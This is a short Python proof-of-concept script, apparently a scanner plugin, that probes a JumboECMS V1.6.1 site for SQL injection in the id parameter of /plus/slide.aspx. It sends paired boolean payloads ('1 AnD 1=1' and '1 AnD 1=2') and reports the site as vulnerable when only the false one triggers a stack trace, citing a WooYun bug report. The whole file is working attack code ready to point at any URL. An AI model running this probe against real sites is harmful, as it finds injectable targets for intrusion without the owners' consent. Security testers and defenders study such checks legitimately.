#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: JumboECMS V1.6.1 注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-062717
author: Lucifer
description: 文件/plus/slide.aspx参数id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['JumboECMS V1.6.1 注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        trueurl = url + "/plus/slide.aspx?id=1%20AnD%201=1"
        falseurl = url + "/plus/slide.aspx?id=1%20AnD%201=2"
        try:
            req1 = requests.get(trueurl, headers=headers, timeout=10, verify=False)
            req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
            if r"Stack trace" not in req1.text and r"Stack trace" in req2.text:
                result[2]=  '存在'
                result[1]= falseurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
